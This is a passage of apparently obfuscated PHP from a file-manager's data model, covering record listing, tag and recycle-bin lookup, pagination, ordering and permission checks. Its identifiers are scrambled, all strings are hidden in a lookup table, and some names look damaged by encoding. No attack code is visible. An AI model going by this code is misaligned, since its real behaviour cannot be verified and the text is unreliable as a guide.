$this->listSource(array($ÏÓ¸–™¬[426] => array($ÏÓ¸–™¬[427], $–Ï³Èı¶))); } $ÒÀûËù‚ = array_to_keyvalue($ÒÀûËù‚[$ÏÓ¸–™¬[369]], $ÏÓ¸–™¬[411]); foreach ($İƒ•™â as &$°ÒÄîÚ¥) { $°ÒÄîÚ¥ = array($ÏÓ¸–™¬[428] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[399]], $ÏÓ¸–™¬[429] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[32]], $ÏÓ¸–™¬[430] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[84]], $ÏÓ¸–™¬[431] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[33]], $ÏÓ¸–™¬[432] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[201]], $ÏÓ¸–™¬[433] => $°ÒÄîÚ¥[$ÏÓ¸–™¬[85]]); if ($°ÒÄîÚ¥[$ÏÓ¸–™¬[33]] == $ÏÓ¸–™¬[425] && $ÒÀûËù‚[$°ÒÄîÚ¥[$ÏÓ¸–™¬[84]]]) { $°ÒÄîÚ¥[$ÏÓ¸–™¬[87]] = $ÒÀûËù‚[$°ÒÄîÚ¥[$ÏÓ¸–™¬[84]]]; } } unset($°ÒÄîÚ¥); return $İƒ•™â; } public function listUserTag($ÍØáÏô­) { $•“è©¯Ø =& $_SERVER[Ó¡Ÿ§‚]; if ($ÍØáÏô­ && !is_array($ÍØáÏô­)) { $ÍØáÏô­ = array($ÍØáÏô­); } $êÈ×œ¿Ö = Model($•“è©¯Ø[434])->listData(); $ŠÓ²†³‘ = array(); $•äå›Ò = array(); foreach ($êÈ×œ¿Ö as $½Ÿ«Òéç) { $ë‡‘·Ø¿ = $½Ÿ«Òéç[$•“è©¯Ø[84]]; if (!$ë‡‘·Ø¿) { continue; } if (!isset($•äå›Ò[$ë‡‘·Ø¿])) { $•äå›Ò[$ë‡‘·Ø¿] = array(); } $•äå›Ò[$ë‡‘·Ø¿][] = $½Ÿ«Òéç[$•“è©¯Ø[435]]; $ŠÓ²†³‘[$½Ÿ«Òéç[$•“è©¯Ø[84]]] = $½Ÿ«Òéç; } $“‹¾ä‘ = array(); $…¹“Ë‹Ê = array(); $é›ü«Ş¶ = array(); foreach ($•äå›Ò as $Éñ†·Ù‰ => $’îëó÷½) { $Ÿ¨²¸ Ë = !0; if (!$ÍØáÏô­) { $“‹¾ä‘[] = $Éñ†·Ù‰; continue; } foreach ($ÍØáÏô­ as $Ôóí¦‚) { if (!in_array($Ôóí¦‚, $’îëó÷½)) { $Ÿ¨²¸ Ë = !1; break; } } if (!$Ÿ¨²¸ Ë) { continue; } if (!is_numeric($Éñ†·Ù‰)) { $ğÎªà† = $ŠÓ²†³‘[$Éñ†·Ù‰]; $Š¼Ë³ÇÑ = array($•“è©¯Ø[32] => $ğÎªà†[$•“è©¯Ø[32]], $•“è©¯Ø[84] => $ğÎªà†[$•“è©¯Ø[84]], $•“è©¯Ø[33] => $ğÎªà†[$•“è©¯Ø[33]], $•“è©¯Ø[87] => array($•“è©¯Ø[436] => 1), $•“è©¯Ø[202] => !0); if ($ğÎªà†[$•“è©¯Ø[33]] == $•“è©¯Ø[200]) { $é›ü«Ş¶[] = $Š¼Ë³ÇÑ; } if ($ğÎªà†[$•“è©¯Ø[33]] == $•“è©¯Ø[75]) { $…¹“Ë‹Ê[] = $Š¼Ë³ÇÑ; } continue; } $“‹¾ä‘[] = $Éñ†·Ù‰; } if ($“‹¾ä‘) { $—ú¬âÊ¯ = $this->listSource(array($•“è©¯Ø[426] => array($•“è©¯Ø[427], $“‹¾ä‘))); } $—ú¬âÊ¯ = $—ú¬âÊ¯ ? $—ú¬âÊ¯ : array($•“è©¯Ø[82] => array(), $•“è©¯Ø[83] => array()); $—ú¬âÊ¯[$•“è©¯Ø[82]] = array_merge($—ú¬âÊ¯[$•“è©¯Ø[82]], $…¹“Ë‹Ê); $—ú¬âÊ¯[$•“è©¯Ø[83]] = array_merge($—ú¬âÊ¯[$•“è©¯Ø[83]], $é›ü«Ş¶); if (isset($—ú¬âÊ¯[$•“è©¯Ø[366]]) && count($“‹¾ä‘) == $—ú¬âÊ¯[$•“è©¯Ø[366]][$•“è©¯Ø[367]]) { return $—ú¬âÊ¯; } $òú®” = array(); $ËÖ°œó« = array_to_keyvalue($—ú¬âÊ¯[$•“è©¯Ø[82]], $•“è©¯Ø[12], $•“è©¯Ø[411]); $ŸÊ¯ãö† = array_to_keyvalue($—ú¬âÊ¯[$•“è©¯Ø[83]], $•“è©¯Ø[12], $•“è©¯Ø[411]); $¹êı­ó÷ = array_merge($ŸÊ¯ãö†, $ËÖ°œó«); foreach ($“‹¾ä‘ as $ë‡‘·Ø¿) { if (!in_array($ë‡‘·Ø¿, $¹êı­ó÷)) { $òú®”[] = $ë‡‘·Ø¿; } } if ($òú®”) { Model($•“è©¯Ø[437])->removeBySource($òú®”); } return $—ú¬âÊ¯; } public function listUserRecycle() { $•‘ñÜœ¶ =& $_SERVER[Ó¡Ÿ§‚]; $š¿¹åÛŞ = Model($•‘ñÜœ¶[438])->listData(); if (!$š¿¹åÛŞ) { return array(); } $»óªñÖã = array($•‘ñÜœ¶[426] => array($•‘ñÜœ¶[427], $š¿¹åÛŞ), $•‘ñÜœ¶[439] => 1); return $this->listSource($»óªñÖã); } public function listSource($ù¥”¿, $’ê¥²ì“ = 3000, $ ¨ÀØ’â = false) { $ñ¼„½à¡ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($ù¥”¿[$ñ¼„½à¡[440]])) { $ù¥”¿[$ñ¼„½à¡[440]] = 0; } if (isset($ù¥”¿[$ñ¼„½à¡[441]]) && $ù¥”¿[$ñ¼„½à¡[441]] == $ñ¼„½à¡[198]) { $ù¥”¿[$ñ¼„½à¡[421]] = array($ñ¼„½à¡[331], $ñ¼„½à¡[442]); } $½ĞÅš«Ö = $ñ¼„½à¡[443]; $¦Œ”¦Í„ = $this->field($½ĞÅš«Ö)->_makeOrder()->where($ù¥”¿)->selectPage($’ê¥²ì“); $this->_listPageCheck($¦Œ”¦Í„, $½ĞÅš«Ö, $ù¥”¿); $this->_listDataApply($¦Œ”¦Í„[$ñ¼„½à¡[369]], $ ¨ÀØ’â); $this->_listMake($¦Œ”¦Í„); return $¦Œ”¦Í„; } private function _listPageCheck(&$Šµ½–îµ, $ùÜıáêæ, $µÄÄÓ¥) { $ñç—ñªÅ =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($Šµ½–îµ[$ñç—ñªÅ[366]])) { return; } $”öÒş¥ = $Šµ½–îµ[$ñç—ñªÅ[366]]; if ($”öÒş¥[$ñç—ñªÅ[368]] <= 1) { return; } if ($”öÒş¥[$ñç—ñªÅ[367]] >= 100000) { return; } if (Model($ñç—ñªÅ[444])->get($ñç—ñªÅ[445]) != $ñç—ñªÅ[446]) { return; } $ùÜıáêæ = str_replace(array($ñç—ñªÅ[53], $ñç—ñªÅ[342], $ñç—ñªÅ[231]), $ñç—ñªÅ[12], $ùÜıáêæ); $ùÜıáêæ = $ñç—ñªÅ[447] . str_replace($ñç—ñªÅ[50], $ñç—ñªÅ[448], $ùÜıáêæ) . $ñç—ñªÅ[449]; $ƒÜªï˜ = $ñç—ñªÅ[450]; $ƒÜªï˜ = $ƒÜªï˜ . $ñç—ñªÅ[451]; $¢¿Êñò = $”öÒş¥[$ñç—ñªÅ[363]] * ($”öÒş¥[$ñç—ñªÅ[353]] - 1) . $ñç—ñªÅ[50] . $”öÒş¥[$ñç—ñªÅ[363]]; $ï¡¬ˆûò = $this->_makeOrder(!0); $ŠÏÁÚò  = $ñç—ñªÅ[447] . str_replace($ñç—ñªÅ[50], $ñç—ñªÅ[448], $ï¡¬ˆûò[0]); if (strpos($ŠÏÁÚò , $ñç—ñªÅ[452])) { $ŠÏÁÚò  = str_replace($ñç—ñªÅ[452], $ñç—ñªÅ[453], $ŠÏÁÚò ); } else { $ŠÏÁÚò  .= $ñç—ñªÅ[454] . $ï¡¬ˆûò[1]; } $ÃË‡¹í• = array(); foreach ($µÄÄÓ¥ as $š½‡Ø—® => $°×¶Š¯ş) { $ÃË‡¹í•[$ñç—ñªÅ[447] . $š½‡Ø—®] = $°×¶Š¯ş; } $this->alias($ñç—ñªÅ[455])->field($ùÜıáêæ)->limit($¢¿Êñò)->order($ŠÏÁÚò ); $ªºÆïš = $this->join($ƒÜªï˜)->where($ÃË‡¹í•)->select(); if ($ªºÆïš) { $Šµ½–îµ[$ñç—ñªÅ[369]] = $ªºÆïš; } } protected function _makeOrder($ä—öàí = false) { $–ÚŒ…œÀ =& $_SERVER[Ó¡Ÿ§‚]; $é¦œ…³ñ = Model($–ÚŒ…œÀ[456])->get($–ÚŒ…œÀ[457]); $ò¬«ñ¿« = Model($–ÚŒ…œÀ[456])->get($–ÚŒ…œÀ[458]); $Õ¥•î§¿ = array($–ÚŒ…œÀ[459] => $–ÚŒ…œÀ[460], $–ÚŒ…œÀ[461] => $–ÚŒ…œÀ[462]); $Ñü¸®ö¥ = array($–ÚŒ…œÀ[32] => $–ÚŒ…œÀ[32], $–ÚŒ…œÀ[76] => $–ÚŒ…œÀ[76], $–ÚŒ…œÀ[174] => $–ÚŒ…œÀ[421], $–ÚŒ…œÀ[463] => $–ÚŒ…œÀ[463], $–ÚŒ…œÀ[464] => $–ÚŒ…œÀ[465], $–ÚŒ…œÀ[201] => $–ÚŒ…œÀ[201], $–ÚŒ…œÀ[85] => $–ÚŒ…œÀ[85]); $ ûİ‹¥ = Input::get($–ÚŒ…œÀ[466], $–ÚŒ…œÀ[7], $é¦œ…³ñ, array_keys($Ñü¸®ö¥)); $¡ÜëÀèô = Input::get($–ÚŒ…œÀ[467], $–ÚŒ…œÀ[7], $ò¬«ñ¿«, array_keys($Õ¥•î§¿)); if (!in_array($ ûİ‹¥, array_keys($Ñü¸®ö¥))) { $ ûİ‹¥ = $–ÚŒ…œÀ[32]; } if (!in_array($¡ÜëÀèô, array_keys($Õ¥•î§¿))) { $ ûİ‹¥ = $–ÚŒ…œÀ[459]; } if ($ ûİ‹¥ == $–ÚŒ…œÀ[32]) { } $ï§ºÎëü = $–ÚŒ…œÀ[468] . $Ñü¸®ö¥[$ ûİ‹¥] . $–ÚŒ…œÀ[53] . $Õ¥•î§¿[$¡ÜëÀèô]; $ï§ºÎëü = rtrim(trim($ï§ºÎëü), $–ÚŒ…œÀ[50]); if ($ä—öàí) { return array($ï§ºÎëü, $Õ¥•î§¿[$¡ÜëÀèô]); } return $this->order($ï§ºÎëü); } protected function _listDataApplyItem($á¯ºşù–, $ïñ“²¬¥ = false) { $ €îû‰ˆ = array($á¯ºşù–); $this->_listDataApply($ €îû‰ˆ, $ïñ“²¬¥); return $ €îû‰ˆ[0]; } protected function _listDataApply(&$Ïƒ¯“å, $àùêª¤ = false) { $ˆ¡Ô Ô‰ =& $_SERVER[Ó¡Ÿ§‚]; if (!$Ïƒ¯“å) { $Ïƒ¯“å = array(); return; } $âÑŒ˜ğ° = array_to_keyvalue($Ïƒ¯“å, $ˆ¡Ô Ô‰[12], $ˆ¡Ô Ô‰[411]); $âÑŒ˜ğ° = array_unique($âÑŒ˜ğ°); $this->_listSourceCache($Ïƒ¯“å); if (!$àùêª¤) { $this->_listAppendMeta($Ïƒ¯“å, $âÑŒ˜ğ°); $this->_listAppendFileMeta($Ïƒ¯“å, $âÑŒ˜ğ°); $this->_listAppendChildren($Ïƒ¯“å, $âÑŒ˜ğ°); } $this->_listAppendPath($Ïƒ¯“å); $this->_listAppendAuth($Ïƒ¯“å); $this->_listAppendSourceInfo($Ïƒ¯“å, $âÑŒ˜ğ°); $this->_listAppendUser($Ïƒ¯“å); $this->_listFilterInfo($Ïƒ¯“å, $àùêª¤); $this->_listAppendAuthSecret($Ïƒ¯“å); } protected function _listSourceCache($°ê»áè) { $İÑ—©´ =& $_SERVER[Ó¡Ÿ§‚]; foreach ($°ê»áè as $¨õú¢©) { self::$cacheSourceInfo[$İÑ—©´[469] . $¨õú¢©[$İÑ—©´[411]]] = $¨õú¢©; } } protected function _listFilterInfo(&$Í”¬­øŸ, $Ç£Ï€Š’ = false) { $ªì¢ôÔÔ =& $_SERVER[Ó¡Ÿ§‚]; foreach ($Í”¬­øŸ as &$†¢é¸Ö) { $†¢é¸Ö = $this->pathInfoFilter($†¢é¸Ö); self::$cachePathInfo[$ªì¢ôÔÔ[470] . intval($Ç£Ï€Š’) . $ªì¢ôÔÔ[386] . $†¢é¸Ö[$ªì¢ôÔÔ[411]]] = $†¢é¸Ö; } unset($†¢é¸Ö); } protected function _listMake(&$ä±Øú) { $ÑõàÓ÷ß =& $_SERVER[Ó¡Ÿ§‚]; $ä±Øú[$ÑõàÓ÷ß[82]] = array(); $ä±Øú[$ÑõàÓ÷ß[83]] = array(); foreach ($ä±Øú[$ÑõàÓ÷ß[369]] as $—ÈòÇ²ê) { $äØï•ú” = $—ÈòÇ²ê[$ÑõàÓ÷ß[419]] == 1 ? $ÑõàÓ÷ß[82] : $ÑõàÓ÷ß[83]; $ä±Øú[$äØï•ú”][] = $—ÈòÇ²ê; } unset($ä±Øú[$ÑõàÓ÷ß[369]]); } protected function _listAppendMeta(&$òâÂŠ‚¬, $®Ô…°­) { $ç§òéÅ‰ =& $_SERVER[Ó¡Ÿ§‚]; $ÒœŞ„š = array($ç§òéÅ‰[426] => array($ç§òéÅ‰[427], $®Ô…°­)); $àãÁ”È = Model($ç§òéÅ‰[471])->field($ç§òéÅ‰[472])->where($ÒœŞ„š)->select(); if (!$àãÁ”È) { return; } $²İôÇÄ¹ = array($ç§òéÅ‰[473], $ç§òéÅ‰[474], $ç§òéÅ‰[453]); $‡àş²ƒ¡ = array(); foreach ($àãÁ”È as $É‰ü¯±ä) { if (!isset($‡àş²ƒ¡[$É‰ü¯±ä[$ç§òéÅ‰[411]]])) { $‡àş²ƒ¡[$É‰ü¯±ä[$ç§òéÅ‰[411]]] = array(); } if (in_array($É‰ü¯±ä[$ç§òéÅ‰[94]], $²İôÇÄ¹)) { continue; } $‡àş²ƒ¡[$É‰ü¯±ä[$ç§òéÅ‰[411]]][$É‰ü¯±ä[$ç§òéÅ‰[94]]] = $É‰ü¯±ä[$ç§òéÅ‰[374]]; } foreach ($òâÂŠ‚¬ as &$¿¶­®Ş´) { $¿¶­®Ş´[$ç§òéÅ‰[475]] = !1; if (isset($‡àş²ƒ¡[$¿¶­®Ş´[$ç§òéÅ‰[411]]])) { $¿¶­®Ş´[$ç§òéÅ‰[475]] = $‡àş²ƒ¡[$¿¶­®Ş´[$ç§òéÅ‰[411]]]; } if ($this->fileIsLock($¿¶­®Ş´) && $¿¶­®Ş´[$ç§òéÅ‰[422]]) { $İÊ¿«›Ë = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¿¶­®Ş´[$ç§òéÅ‰[422]][$ç§òéÅ‰[423]] = AuthModel::authDisable($¿¶­®Ş´[$ç§òéÅ‰[422]][$ç§òéÅ‰[423]], $İÊ¿«›Ë); $¿¶­®Ş´[$ç§òéÅ‰[422]][$ç§òéÅ‰[476]][$ç§òéÅ‰[422]] = $¿¶­®Ş´[$ç§òéÅ‰[422]][$ç§òéÅ‰[423]]; } } unset($¿¶­®Ş´); } protected function _listAppendFileMeta(&$ àÎŞµÁ, $²»¢í”¹) { $ä›˜§¥ =& $_SERVER[Ó¡Ÿ§‚]; $‰İ¨Í²µ = array_to_keyvalue($ àÎŞµÁ, $ä›˜§¥[12], $ä›˜§¥[477]); $‰İ¨Í²µ = array_filter(array_unique($‰İ¨Í²µ)); if (!$‰İ¨Í²µ) { return; } $´œÜúƒà = array($ä›˜§¥[478] => array($ä›˜§¥[427], $‰İ¨Í²µ)); $»®æîá° = $ä›˜§¥[479]; $ˆ‰«¥‹¹ = Model($ä›˜§¥[480])->field($»®æîá°)->where($´œÜúƒà)->select(); $ˆ‰«¥‹¹ = array_to_keyvalue($ˆ‰«¥‹¹, $ä›˜§¥[477]); $Ó•º€š = Model($ä›˜§¥[481])->field($ä›˜§¥[482])->where($´œÜúƒà)->select(); $Ó•º€š = $Ó•º€š ? $Ó•º€š : array(); $–·ñ½È€ = array(); foreach ($Ó•º€š as $Àßâ§¤œ) { if (!isset($–·ñ½È€[$Àßâ§¤œ[$ä›˜§¥[477]]])) { $–·ñ½È€[$Àßâ§¤œ[$ä›˜§¥[477]]] = array(); } $–·ñ½È€[$Àßâ§¤œ[$ä›˜§¥[477]]][$Àßâ§¤œ[$ä›˜§¥[94]]] = $Àßâ§¤œ[$ä›˜§¥[374]]; } foreach ($ àÎŞµÁ as &$›¥¶É·) { $ÄÙå°¤™ = $›¥¶É·[$ä›˜§¥[477]]; if (!$ÄÙå°¤™ || !is_array($ˆ‰«¥‹¹[$ÄÙå°¤™])) { continue; } $‘ŸØÍºÏ = $ˆ‰«¥‹¹[$ÄÙå°¤™]; $‘ŸØÍºÏ[$ä›˜§¥[76]] = $›¥¶É·[$ä›˜§¥[76]]; $‘ŸØÍºÏ[$ä›˜§¥[32]] = $›¥¶É·[$ä›˜§¥[32]]; if (!isset(self::$cacheFileInfo[$ä›˜§¥[483] . $ÄÙå°¤™])) { self::$cacheFileInfo[$ä›˜§¥[483] . $ÄÙå°¤™] = array_merge(array(), $‘ŸØÍºÏ); } unset($ˆ‰«¥‹¹[$ÄÙå°¤™][$ä›˜§¥[84]]); $ëÈÅÔÎø = is_array($–·ñ½È€[$ÄÙå°¤™]) ? $–·ñ½È€[$ÄÙå°¤™] : array(); $›¥¶É·[$ä›˜§¥[170]] = array_merge($ëÈÅÔÎø, $ˆ‰«¥‹¹[$ÄÙå°¤™]); if (isset($›¥¶É·[$ä›˜§¥[170]][$ä›˜§¥[169]])) { $›¥¶É·[$ä›˜§¥[169]] = json_decode($›¥¶É·[$ä›˜§¥[170]][$ä›˜§¥[169]], !0); unset($›¥¶É·[$ä›˜§¥[170]][$ä›˜§¥[169]]); } } unset($›¥¶É·); } protected function _listAppendSourceInfo(&$º·õÙ˜Á, $Í¨ç –) { $ªêÅá€Ç =& $_SERVER[Ó¡Ÿ§‚]; $Ñ¨Âà±Œ = Model($ªêÅá€Ç[484])->listData(); $ë«õş° = Model($ªêÅá€Ç[434])->listData(); $²à¢¬× = Model($ªêÅá€Ç[424])->listData(); $ÃàêŒŞ = Model($ªêÅá€Ç[485])->listSimple(); $ş½ìñò· = array_to_keyvalue($Ñ¨Âà±Œ, $ªêÅá€Ç[399]); $†§—å„Û = array_to_keyvalue_group($ë«õş°, $ªêÅá€Ç[84], $ªêÅá€Ç[435]); $‰øÉ“¿ = array_to_keyvalue($²à¢¬×, $ªêÅá€Ç[84]); $ÑóôÖ = array_to_keyvalue_group($ÃàêŒŞ, $ªêÅá€Ç[411]); foreach ($º·õÙ˜Á as &$©–ãª¿) { $©–ãª¿[$ªêÅá€Ç[87]] = array($ªêÅá€Ç[486] => 0, $ªêÅá€Ç[487] => 0, $ªêÅá€Ç[488] => 0); if (isset($‰øÉ“¿[$©–ãª¿[$ªêÅá€Ç[411]]])) { $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[489]] = 1; $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[490]] = $‰øÉ“¿[$©–ãª¿[$ªêÅá€Ç[411]]][$ªêÅá€Ç[32]]; } if ($†§—å„Û && $ş½ìñò· && isset($†§—å„Û[$©–ãª¿[$ªêÅá€Ç[411]]])) { $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[491]] = array(); foreach ($†§—å„Û[$©–ãª¿[$ªêÅá€Ç[411]]] as $úì„õ¯–) { $ôÎ†¢¬ú = $ş½ìñò·[$úì„õ¯–]; $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[491]][] = array($ªêÅá€Ç[492] => $ôÎ†¢¬ú[$ªêÅá€Ç[399]], $ªêÅá€Ç[429] => $ôÎ†¢¬ú[$ªêÅá€Ç[32]], $ªêÅá€Ç[493] => $ôÎ†¢¬ú[$ªêÅá€Ç[494]]); } } if ($ÑóôÖ && isset($ÑóôÖ[$©–ãª¿[$ªêÅá€Ç[411]]])) { $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[495]] = array(); foreach ($ÑóôÖ[$©–ãª¿[$ªêÅá€Ç[411]]] as $¯ï„‚ô·) { $ä´±éÆÕ = $ªêÅá€Ç[496]; if ($¯ï„‚ô·[$ªêÅá€Ç[497]] == $ªêÅá€Ç[88]) { $ä´±éÆÕ .= $ªêÅá€Ç[498]; } $©–ãª¿[$ªêÅá€Ç[87]][$ªêÅá€Ç[495]] = array_field_key($¯ï„‚ô·, explode($ªêÅá€Ç[50], $ä´±éÆÕ)); } } } unset($©–ãª¿); return $º·õÙ˜Á; } protected function _listAppendChildren(&$–ÎÆªó, $Ğï†ÂÑ¤) { $Ú»«•¯‹ =& $_SERVER[Ó¡Ÿ§‚]; $…Ò‘¹µ = array(); $ó·‹áÌè = array($Ú»«•¯‹[207] => 0, $Ú»«•¯‹[208] => 0); foreach ($–ÎÆªó as &$“€»—¯â) { if (!$“€»—¯â[$Ú»«•¯‹[419]]) { continue; } $…Ò‘¹µ[] = $“€»—¯â[$Ú»«•¯‹[411]]; } unset($“€»—¯â); if (!$…Ò‘¹µ) { return; } $¹Ç¾ÖÍ = array($Ú»«•¯‹[441] => array($Ú»«•¯‹[7], $…Ò‘¹µ), $Ú»«•¯‹[440] => 0); $ÀÀùÒ¹ü = array($Ú»«•¯‹[441], $Ú»«•¯‹[419], $Ú»«•¯‹[499] => $Ú»«•¯‹[500]); $ö°¥°áÙ = $this->field($ÀÀùÒ¹ü)->where($¹Ç¾ÖÍ)->group($Ú»«•¯‹[501])->select(); $áòÏ–¢¸ = array(); foreach ($ö°¥°áÙ as $œèŞİ×ò) { $ş–Ç­ª¹ = $œèŞİ×ò[$Ú»«•¯‹[441]]; $É™úé¼ô = $œèŞİ×ò[$Ú»«•¯‹[419]] == $Ú»«•¯‹[88] ? $Ú»«•¯‹[208] : $Ú»«•¯‹[207]; if (!isset($áòÏ–¢¸[$ş–Ç­ª¹])) { $áòÏ–¢¸[$ş–Ç­ª¹] = array($Ú»«•¯‹[207] => 0, $Ú»«•¯‹[208] => 0); } $áòÏ–¢¸[$ş–Ç­ª¹][$É™úé¼ô] += $œèŞİ×ò[$Ú»«•¯‹[500]]; } foreach ($–ÎÆªó as &$“€»—¯â) { if (!$“€»—¯â[$Ú»«•¯‹[419]]) { continue; } $Øå®ô¹¤ = is_array($áòÏ–¢¸[$“€»—¯â[$Ú»«•¯‹[411]]]) ? $áòÏ–¢¸[$“€»—¯â[$Ú»«•¯‹[411]]] : $ó·‹áÌè; $“€»—¯â[$Ú»«•¯‹[208]] = $Øå®ô¹¤[$Ú»«•¯‹[208]]; $“€»—¯â[$Ú»«•¯‹[207]] = $Øå®ô¹¤[$Ú»«•¯‹[207]]; unset($“€»—¯â[$Ú»«•¯‹[421]]); } unset($“€»—¯â); } protected function _listAppendAuth(&$¾¿¹Š¼) { $É™åù‹ =& $_SERVER[Ó¡Ÿ§‚]; $ñë¥äôŸ = array(); foreach ($¾¿¹Š¼ as $ÎûÔåÎÑ) { if ($ÎûÔåÎÑ[$É™åù‹[420]] == self::TYPE_GROUP) { $ñë¥äôŸ[] = $ÎûÔåÎÑ[$É™åù‹[411]]; } } if (!$ñë¥äôŸ) { return; } $¬Ä×şşè = array_to_keyvalue($¾¿¹Š¼, $É™åù‹[411]); $‰³éÌÍø = Model($É™åù‹[502])->getSourceList($ñë¥äôŸ, $¬Ä×şşè); $‹èŒáôË = $GLOBALS[$É™åù‹[503]] == 1; foreach ($¾¿¹Š¼ as $ã€óÒÃ => &$ÎûÔåÎÑ) { $ÎûÔåÎÑ[$É™åù‹[422]] = $‰³éÌÍø[$ÎûÔåÎÑ[$É™åù‹[411]]]; if (!$ÎûÔåÎÑ[$É™åù‹[422]] && $ÎûÔåÎÑ[$É™åù‹[420]] == self::TYPE_GROUP) { $ÎûÔåÎÑ[$É™åù‹[422]] = Action($É™åù‹[504])->pathGroupAuthMake($ÎûÔåÎÑ[$É™åù‹[505]]); if (!$ÎûÔåÎÑ[$É™åù‹[422]] && !$‹èŒáôË) { $ÎûÔåÎÑ[$É™åù‹[203]] = !1; $ÎûÔåÎÑ[$É™åù‹[202]] = !1; } } if ($ÎûÔåÎÑ[$É™åù‹[422]]) { $ÎûÔåÎÑ[$É™åù‹[203]] = AuthModel::authCheckEdit($ÎûÔåÎÑ[$É™åù‹[422]][$É™åù‹[423]]); $ÎûÔåÎÑ[$É™åù‹[202]] = AuthModel::authCheckView($ÎûÔåÎÑ[$É™åù‹[422]][$É™åù‹[423]]); } $this->groupPathDisplay($ÎûÔåÎÑ); } unset($ÎûÔåÎÑ); } public function _listAppendAuthSecret(&$ì¿·ŒéÊ) { $³øà§çš =& $_SERVER[Ó¡Ÿ§‚]; if (Model($³øà§çš[444])->get($³øà§çš[506]) != $³øà§çš[88]) { return; } static $¯êÏ¡‰œ = false; if (!$¯êÏ¡‰œ) { $¡™ÑÎ¶Ä = Model($³øà§çš[507]); $«Ş‘ˆÀ… = Model($³øà§çš[508]); $¯êÏ¡‰œ = $«Ş‘ˆÀ…->listData(); $¯êÏ¡‰œ = array_to_keyvalue($¯êÏ¡‰œ, $³øà§çš[411]); $ÕÌ¤åº‚ = json_decode(Model($³øà§çš[444])->get($³øà§çš[509]), !0); $ÕÌ¤åº‚ = array_to_keyvalue($ÕÌ¤åº‚, $³øà§çš[399]); foreach ($¯êÏ¡‰œ as $²«·´¤¥ => $ÎæÒï€•) { $ö´§çÎ½ = $ÕÌ¤åº‚[$ÎæÒï€•[$³øà§çš[510]]]; if (!$ö´§çÎ½) { $«Ş‘ˆÀ…->remove($ÎæÒï€•[$³øà§çš[399]]); unset($¯êÏ¡‰œ[$²«·´¤¥]); continue; } $ª“ıŠÑ¥ = $¡™ÑÎ¶Ä->listData($ö´§çÎ½[$³øà§çš[422]]); if (!$ª“ıŠÑ¥) { $«Ş‘ˆÀ…->remove($ÎæÒï€•[$³øà§çš[399]]); unset($¯êÏ¡‰œ[$²«·´¤¥]); continue; } $ÎæÒï€•[$³øà§çš[422]] = $ª“ıŠÑ¥; $ÎæÒï€•[$³øà§çš[511]] = $ö´§çÎ½; $ÎæÒï€•[$³øà§çš[512]] = Model($³øà§çš[513])->getInfoSimpleOuter($ÎæÒï€•[$³øà§çš[463]]); $¯êÏ¡‰œ[$²«·´¤¥] = $ÎæÒï€•; } } $äˆÙ¯Ö = USER_ID; $¦Ñ¼şŞÕ = array(); $ëç²çõø = $this->_listAppendPath($¦Ñ¼şŞÕ, !0); foreach ($ì¿·ŒéÊ as $²«·´¤¥ => &$ÎæÒï€•) { if (!is_array($ÎæÒï€•[$³øà§çš[422]])) { continue; } if ($ÎæÒï€•[$³øà§çš[420]] != $³øà§çš[514]) { continue; } if (isset($¯êÏ¡‰œ[$ÎæÒï€•[$³øà§çš[411]]])) { $ÄÔñÇ = $¯êÏ¡‰œ[$ÎæÒï€•[$³øà§çš[411]]]; if (!is_array($ÎæÒï€•[$³øà§çš[475]])) { $ÎæÒï€•[$³øà§çš[475]] = array(); } $ÎæÒï€•[$³øà§çš[475]][$³øà§çš[515]] = $ÄÔñÇ[$³øà§çš[510]]; $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[516]] = $ÄÔñÇ; $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[517]] = $ÎæÒï€•[$³øà§çš[518]]; $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[519]] = $³øà§çš[88]; if ($ÄÔñÇ[$³øà§çš[463]] != $äˆÙ¯Ö) { $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[423]] = $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[423]] & $ÄÔñÇ[$³øà§çš[422]][$³øà§çš[422]]; } continue; } $”‰ƒÆ« = $this->parentLevelArray($ÎæÒï€•[$³øà§çš[520]]); $‹’‰×š¬ = array_reverse($”‰ƒÆ«); foreach ($‹’‰×š¬ as $‰­éÙä— => $ôÍ©äÖ) { if (!isset($¯êÏ¡‰œ[$ôÍ©äÖ])) { continue; } $ÄÔñÇ = $¯êÏ¡‰œ[$ôÍ©äÖ]; $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[516]] = $ÄÔñÇ; if ($ÄÔñÇ[$³øà§çš[463]] != $äˆÙ¯Ö) { $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[423]] = $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[423]] & $ÄÔñÇ[$³øà§çš[422]][$³øà§çš[422]]; } $ä›İÕ¼Ã = $³øà§çš[12]; $âºÖ²Õ = count($”‰ƒÆ«) - $‰­éÙä—; for ($³®¬š†ğ = 0; $³®¬š†ğ < $âºÖ²Õ; $³®¬š†ğ++) { if (!isset($ëç²çõø[$”‰ƒÆ«[$³®¬š†ğ]])) { $ä›İÕ¼Ã = $³øà§çš[12]; break; } $ä›İÕ¼Ã = $ä›İÕ¼Ã . rtrim($ëç²çõø[$”‰ƒÆ«[$³®¬š†ğ]], $³øà§çš[8]) . $³øà§çš[8]; } $ÎæÒï€•[$³øà§çš[422]][$³øà§çš[517]] = rtrim($ä›İÕ¼Ã, $³øà§çš[8]) . $³øà§çš[8]; break; } } unset($ÎæÒï€•); } public function groupPathDisplay(&$šĞò´ï÷) { $ñİ¿öõ‰ =& $_SERVER[Ó¡Ÿ§‚]; if ($šĞò´ï÷[$ñİ¿öõ‰[420]] != self::TYPE_GROUP) { return; } $¸–Š“¯ = Model($ñİ¿öõ‰[521])->getInfo($šĞò´ï÷[$ñİ¿öõ‰[505]]); $ôºì“¥° = 